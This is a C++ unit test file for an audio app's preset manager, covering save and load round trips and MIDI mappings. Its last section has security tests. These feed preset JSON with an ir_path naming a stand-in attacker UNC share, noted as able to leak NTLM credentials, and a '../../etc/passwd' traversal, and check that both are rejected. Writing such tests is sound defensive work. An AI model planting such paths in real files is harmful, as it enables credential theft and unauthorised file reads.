#include "test_framework.h"
#include "preset_manager.h"
#include "audio/audio_engine.h"
#include "audio/effects/noise_gate.h"
#include "audio/effects/compressor.h"
#include "audio/effects/overdrive.h"
#include "audio/effects/equalizer.h"
#include "audio/effects/reverb.h"
#include "audio/effects/cabinet_sim.h"

#include <fstream>
#include <cstdio>
#include <cstring>
#include <filesystem>

using namespace Amplitron;

// Helper: check if file or directory exists
static bool file_exists(const std::string& path) {
    return std::filesystem::exists(path);
}

// Helper: read entire file to string
static std::string read_file(const std::string& path) {
    std::ifstream f(path);
    std::string content((std::istreambuf_iterator<char>(f)),
                         std::istreambuf_iterator<char>());
    return content;
}

// ============================================================
// PresetManager tests
// ============================================================

TEST(preset_get_presets_dir_creates_dir) {
    std::string dir = PresetManager::get_presets_dir();
    ASSERT_FALSE(dir.empty());
}

TEST(preset_save_creates_file) {
    AudioEngine engine;
    engine.initialize();

    // Add some effects
    auto ng = std::make_shared<NoiseGate>();
    ng->set_enabled(true);
    engine.add_effect(ng);

    auto od = std::make_shared<Overdrive>();
    od->set_enabled(false);
    engine.add_effect(od);

    engine.set_input_gain(0.8f);
    engine.set_output_gain(0.6f);

    std::string path = "presets/test_save_preset.json";
    bool ok = PresetManager::save_preset(path, "Test Preset", "A test description", engine);
    ASSERT_TRUE(ok);
    ASSERT_TRUE(file_exists(path));

    // Verify JSON contains expected fields
    std::string json = read_file(path);
    ASSERT_TRUE(json.find("\"name\"") != std::string::npos);
    ASSERT_TRUE(json.find("Test Preset") != std::string::npos);
    ASSERT_TRUE(json.find("A test description") != std::string::npos);
    ASSERT_TRUE(json.find("\"effects\"") != std::string::npos);
    ASSERT_TRUE(json.find("Noise Gate") != std::string::npos);
    ASSERT_TRUE(json.find("Overdrive") != std::string::npos);
    ASSERT_TRUE(json.find("input_gain") != std::string::npos);
    ASSERT_TRUE(json.find("output_gain") != std::string::npos);

    // Cleanup
    std::remove(path.c_str());
    engine.shutdown();
}

TEST(preset_save_and_load_roundtrip) {
    AudioEngine engine;
    engine.initialize();

    // Build a signal chain
    auto ng = std::make_shared<NoiseGate>();
    ng->set_enabled(true);
    engine.add_effect(ng);

    auto eq = std::make_shared<Equalizer>();
    eq->set_enabled(true);
    // Modify a parameter
    if (!eq->params().empty()) {
        eq->params()[0].value = eq->params()[0].min_val +
            (eq->params()[0].max_val - eq->params()[0].min_val) * 0.75f;
    }
    engine.add_effect(eq);

    auto rv = std::make_shared<Reverb>();
    rv->set_enabled(true);
    rv->set_mix(0.3f);
    engine.add_effect(rv);

    engine.set_input_gain(0.65f);
    engine.set_output_gain(0.9f);

    // Save
    std::string path = "presets/test_roundtrip.json";
    bool saved = PresetManager::save_preset(path, "Roundtrip", "roundtrip test", engine);
    ASSERT_TRUE(saved);

    // Capture original state
    float orig_input_gain = engine.get_input_gain();
    float orig_output_gain = engine.get_output_gain();
    int orig_effects_count = static_cast<int>(engine.effects().size());
    std::string orig_effect0_name = engine.effects()[0]->name();
    bool orig_effect0_enabled = engine.effects()[0]->is_enabled();

    // Clear and reload
    // Load into a fresh engine
    AudioEngine engine2;
    engine2.initialize();

    bool loaded = PresetManager::load_preset(path, engine2);
    ASSERT_TRUE(loaded);

    // Verify loaded state matches
    ASSERT_EQ(static_cast<int>(engine2.effects().size()), orig_effects_count);
    ASSERT_NEAR(engine2.get_input_gain(), orig_input_gain, 0.01f);
    ASSERT_NEAR(engine2.get_output_gain(), orig_output_gain, 0.01f);
    ASSERT_TRUE(std::strcmp(engine2.effects()[0]->name(), orig_effect0_name.c_str()) == 0);
    ASSERT_EQ(engine2.effects()[0]->is_enabled(), orig_effect0_enabled);

    // Check reverb mix was preserved
    ASSERT_NEAR(engine2.effects()[2]->get_mix(), 0.3f, 0.05f);

    // Cleanup
    std::remove(path.c_str());
    engine.shutdown();
    engine2.shutdown();
}

TEST(preset_load_nonexistent_fails) {
    AudioEngine engine;
    engine.initialize();

    bool loaded = PresetManager::load_preset("presets/does_not_exist_12345.json", engine);
    ASSERT_FALSE(loaded);

    engine.shutdown();
}

TEST(preset_list_finds_files) {
    // Save a preset so there's at least one
    AudioEngine engine;
    engine.initialize();
    engine.add_effect(std::make_shared<NoiseGate>());

    std::string dir = PresetManager::get_presets_dir();
    std::string path = dir + "/test_list_preset.json";
    PresetManager::save_preset(path, "ListTest", "", engine);

    auto presets = PresetManager::list_presets();
    // Should find at least the one we just saved
    bool found = false;
    for (auto& p : presets) {
        if (p.find("test_list_preset.json") != std::string::npos) {
            found = true;
            break;
        }
    }
    ASSERT_TRUE(found);

    // Cleanup
    std::remove(path.c_str());
    engine.shutdown();
}

TEST(preset_save_empty_name_still_works) {
    AudioEngine engine;
    engine.initialize();
    engine.add_effect(std::make_shared<Compressor>());

    std::string path = "presets/test_empty_name.json";
    bool ok = PresetManager::save_preset(path, "", "", engine);
    ASSERT_TRUE(ok);
    ASSERT_TRUE(file_exists(path));

    std::remove(path.c_str());
    engine.shutdown();
}

TEST(preset_set_presets_dir_copies_bundled_presets) {
    // Create a temporary test directory
    std::string test_dir = "presets/test_new_presets_dir_detailed";

    // Remove if it exists from a previous run
    #ifdef _WIN32
        system(("rmdir /s /q \"" + test_dir + "\" >nul 2>&1").c_str());
    #else
        system(("rm -rf \"" + test_dir + "\" 2>/dev/null").c_str());
    #endif

    // Set the presets directory to our test directory
    PresetManager::set_presets_dir(test_dir);

    // Verify the directory exists
    ASSERT_TRUE(file_exists(test_dir));

    // Count JSON files in the test directory
    std::vector<std::string> test_dir_files;
    for (const auto& entry : std::filesystem::directory_iterator(test_dir)) {
        if (entry.path().extension() == ".json") {
            test_dir_files.push_back(entry.path().string());
        }
    }

    // We should have copied presets to the new directory
    ASSERT_TRUE(test_dir_files.size() > 0);

    // Verify at least one copied preset file exists and is readable
    bool found_valid_preset = false;
    for (const auto& preset_path : test_dir_files) {
        if (file_exists(preset_path)) {
            std::string content = read_file(preset_path);
            if (!content.empty() && content.find("\"format_version\"") != std::string::npos) {
                found_valid_preset = true;
                break;
            }
        }
    }
    ASSERT_TRUE(found_valid_preset);

    // Cleanup - reset to default and remove test directory
    PresetManager::set_presets_dir("");
    std::filesystem::remove_all(test_dir);
}

TEST(preset_midi_mappings_roundtrip) {
    AudioEngine engine;
    engine.initialize();

    std::vector<MidiMapping> mappings;
    MidiMapping m1;
    m1.cc_number = 74;
    m1.midi_channel = 0;
    m1.target_type = MidiTargetType::EffectParam;
    m1.mode = MidiMappingMode::Continuous;
    m1.effect_name = "WahPedal";
    m1.param_name = "Sweep";
    mappings.push_back(m1);

    MidiMapping m2;
    m2.cc_number = 64;
    m2.midi_channel = -1;
    m2.target_type = MidiTargetType::EffectBypass;
    m2.mode = MidiMappingMode::Toggle;
    m2.effect_name = "Overdrive";
    m2.param_name = "";
    mappings.push_back(m2);

    std::string path = "presets/test_midi_mappings.json";
    bool saved = PresetManager::save_preset(path, "Midi Test", "Testing midi mappings", engine, mappings);
    ASSERT_TRUE(saved);

    // Read json to verify
    std::string json = read_file(path);
    ASSERT_TRUE(json.find("\"midi_mappings\"") != std::string::npos);
    ASSERT_TRUE(json.find("WahPedal") != std::string::npos);

    // Verify loading
    AudioEngine engine2;
    engine2.initialize();
    
    // We can't easily check internal MidiManager state from PresetManager without passing one,
    // so let's instantiate a MidiManager to see if it receives the mappings.
    MidiManager midi_manager;
    midi_manager.clear_mappings();
    bool loaded = PresetManager::load_preset(path, engine2, &midi_manager);
    ASSERT_TRUE(loaded);

    const auto& loaded_mappings = midi_manager.mappings();
    ASSERT_EQ(loaded_mappings.size(), 2);
    
    ASSERT_EQ(loaded_mappings[0].cc_number, 74);
    ASSERT_EQ(loaded_mappings[0].midi_channel, 0);
    ASSERT_EQ(static_cast<int>(loaded_mappings[0].target_type), static_cast<int>(MidiTargetType::EffectParam));
    ASSERT_EQ(static_cast<int>(loaded_mappings[0].mode), static_cast<int>(MidiMappingMode::Continuous));
    ASSERT_EQ(loaded_mappings[0].effect_name, "WahPedal");
    ASSERT_EQ(loaded_mappings[0].param_name, "Sweep");

    ASSERT_EQ(loaded_mappings[1].cc_number, 64);
    ASSERT_EQ(loaded_mappings[1].midi_channel, -1);
    ASSERT_EQ(static_cast<int>(loaded_mappings[1].target_type), static_cast<int>(MidiTargetType::EffectBypass));
    ASSERT_EQ(static_cast<int>(loaded_mappings[1].mode), static_cast<int>(MidiMappingMode::Toggle));
    ASSERT_EQ(loaded_mappings[1].effect_name, "Overdrive");
    ASSERT_EQ(loaded_mappings[1].param_name, "");

    // Cleanup
    std::remove(path.c_str());
    engine.shutdown();
    engine2.shutdown();
}

// ============================================================
// Security: malicious ir_path values in preset JSON
// ============================================================

// Helper: write a raw JSON preset string to a temp file and load it.
// Returns true if load_preset() succeeds (preset loads), regardless of
// whether the IR itself was accepted. Callers verify IR state separately.
static bool load_raw_preset(const std::string& json,
                             const std::string& preset_path,
                             Amplitron::AudioEngine& engine) {
    {
        std::ofstream f(preset_path);
        if (!f.is_open()) return false;
        f << json;
    }
    bool ok = Amplitron::PresetManager::load_preset(preset_path, engine, nullptr);
    std::remove(preset_path.c_str());
    return ok;
}

TEST(preset_malicious_ir_unc_backslash_rejected) {
    // A preset with a Windows UNC path must load successfully (the Cabinet
    // effect is added to the chain) but the IR must NOT be loaded — attempting
    // to open \\server\share would leak NTLM credentials on Windows.
    const std::string malicious_json = R"({
        "format_version": 1,
        "name": "Evil Preset",
        "description": "",
        "input_gain": 1.0,
        "output_gain": 1.0,
        "effects": [{
            "type": "Cabinet",
            "enabled": true,
            "mix": 1.0,
            "params": [],
            "metadata": { "ir_path": "\\\\attacker.example.com\\share\\evil.wav" }
        }],
        "midi_mappings": []
    })";

    Amplitron::AudioEngine engine;
    engine.initialize();

    const std::string preset_path = "presets/test_malicious_unc.json";
    std::filesystem::create_directories("presets");
    bool loaded = load_raw_preset(malicious_json, preset_path, engine);

    ASSERT_TRUE(loaded);  // Preset itself loads fine

    // The Cabinet effect should exist in the chain but have no IR loaded
    bool found_cabinet = false;
    bool ir_loaded = false;
    for (const auto& fx : engine.effects()) {
        if (std::strcmp(fx->name(), "Cabinet") == 0) {
            found_cabinet = true;
            auto* cab = dynamic_cast<Amplitron::CabinetSim*>(fx.get());
            if (cab && cab->has_ir()) ir_loaded = true;
        }
    }
    ASSERT_TRUE(found_cabinet);
    ASSERT_FALSE(ir_loaded);

    engine.shutdown();
}

TEST(preset_malicious_ir_unc_forward_slash_rejected) {
    // //server/share UNC form — must also be rejected.
    const std::string malicious_json = R"({
        "format_version": 1,
        "name": "Evil Preset 2",
        "description": "",
        "input_gain": 1.0,
        "output_gain": 1.0,
        "effects": [{
            "type": "Cabinet",
            "enabled": true,
            "mix": 1.0,
            "params": [],
            "metadata": { "ir_path": "//attacker.example.com/share/evil.wav" }
        }],
        "midi_mappings": []
    })";

    Amplitron::AudioEngine engine;
    engine.initialize();

    const std::string preset_path = "presets/test_malicious_unc2.json";
    std::filesystem::create_directories("presets");
    bool loaded = load_raw_preset(malicious_json, preset_path, engine);

    ASSERT_TRUE(loaded);

    bool ir_loaded = false;
    for (const auto& fx : engine.effects()) {
        if (std::strcmp(fx->name(), "Cabinet") == 0) {
            auto* cab = dynamic_cast<Amplitron::CabinetSim*>(fx.get());
            if (cab && cab->has_ir()) ir_loaded = true;
        }
    }
    ASSERT_FALSE(ir_loaded);

    engine.shutdown();
}

TEST(preset_malicious_ir_traversal_rejected) {
    // Path traversal attempting to escape the filesystem root and read a
    // sensitive file must be rejected; the preset chain must still load.
    const std::string malicious_json = R"({
        "format_version": 1,
        "name": "Traversal Preset",
        "description": "",
        "input_gain": 1.0,
        "output_gain": 1.0,
        "effects": [{
            "type": "Cabinet",
            "enabled": true,
            "mix": 1.0,
            "params": [],
            "metadata": { "ir_path": "../../etc/passwd" }
        }],
        "midi_mappings": []
    })";

    Amplitron::AudioEngine engine;
    engine.initialize();

    const std::string preset_path = "presets/test_malicious_traversal.json";
    std::filesystem::create_directories("presets");
    bool loaded = load_raw_preset(malicious_json, preset_path, engine);

    ASSERT_TRUE(loaded);

    bool ir_loaded = false;
    for (const auto& fx : engine.effects()) {
        if (std::strcmp(fx->name(), "Cabinet") == 0) {
            auto* cab = dynamic_cast<Amplitron::CabinetSim*>(fx.get());
            if (cab && cab->has_ir()) ir_loaded = true;
        }
    }
    ASSERT_FALSE(ir_loaded);

    engine.shutdown();
}

TEST(preset_benign_no_ir_path_loads_cleanly) {
    // A well-formed preset without an ir_path must load completely unaffected
    // by the new validation code.
    const std::string benign_json = R"({
        "format_version": 1,
        "name": "Benign Preset",
        "description": "Clean chain",
        "input_gain": 0.9,
        "output_gain": 0.8,
        "effects": [{
            "type": "Noise Gate",
            "enabled": true,
            "mix": 1.0,
            "params": [],
            "metadata": {}
        }],
        "midi_mappings": []
    })";

    Amplitron::AudioEngine engine;
    engine.initialize();

    const std::string preset_path = "presets/test_benign.json";
    std::filesystem::create_directories("presets");
    bool loaded = load_raw_preset(benign_json, preset_path, engine);

    ASSERT_TRUE(loaded);
    ASSERT_FALSE(engine.effects().empty());

    engine.shutdown();
}

TEST(preset_cabinet_no_ir_path_loads_without_ir) {
    // Cabinet in a preset with no ir_path metadata must be added to the chain
    // but have no IR active — the parametric EQ fallback takes over.
    const std::string json = R"({
        "format_version": 1,
        "name": "Cabinet No IR",
        "description": "",
        "input_gain": 1.0,
        "output_gain": 1.0,
        "effects": [{
            "type": "Cabinet",
            "enabled": true,
            "mix": 1.0,
            "params": [],
            "metadata": {}
        }],
        "midi_mappings": []
    })";

    Amplitron::AudioEngine engine;
    engine.initialize();

    const std::string preset_path = "presets/test_cab_no_ir.json";
    std::filesystem::create_directories("presets");
    bool loaded = load_raw_preset(json, preset_path, engine);

    ASSERT_TRUE(loaded);

    bool found_cabinet = false;
    bool ir_loaded = false;
    for (const auto& fx : engine.effects()) {
        if (std::strcmp(fx->name(), "Cabinet") == 0) {
            found_cabinet = true;
            auto* cab = dynamic_cast<Amplitron::CabinetSim*>(fx.get());
            if (cab && cab->has_ir()) ir_loaded = true;
        }
    }
    ASSERT_TRUE(found_cabinet);
    ASSERT_FALSE(ir_loaded);

    engine.shutdown();
}
